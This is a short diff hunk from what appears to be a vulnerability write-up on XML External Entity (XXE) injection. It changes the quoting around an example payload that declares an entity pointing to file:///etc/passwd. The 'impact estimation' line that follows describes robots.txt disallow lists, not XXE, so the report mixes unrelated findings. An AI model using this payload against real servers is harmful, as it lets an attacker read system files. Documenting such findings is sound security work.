@@ -14,8 +14,8 @@
 2. Edit oldwasdat-exampe.xml- MALICIOUS XML document and include an external entity declaration pointing to a resource that want to access, in this case want to access
 
   ‘/etc/passwd’ on the server. As in the example below :
-  <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
-  <search>&xxe;</search> </code>
+  " <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+  <search>&xxe;</search> "
    
 **Impact estimation:**
 – Low Severity: User/robot can identify restricted or confidential information on thesite and disallow list can serve as a map to the first place to look.
